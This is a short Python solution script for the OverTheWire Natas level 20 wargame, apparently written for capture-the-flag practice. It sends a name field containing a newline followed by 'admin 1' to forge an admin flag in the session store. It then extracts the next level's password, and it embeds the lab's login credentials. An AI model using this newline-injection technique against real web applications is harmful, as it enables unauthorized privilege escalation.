import requests

url = "http://natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF@natas20.natas.labs.overthewire.org"
	
s = requests.Session()
r = s.post(url, data={"name": "john\nadmin 1"})
r = s.get(url)
password = r.text.split('Password: ')[1].split("</pre>")[0]

print(f"Natas21 password : {password}")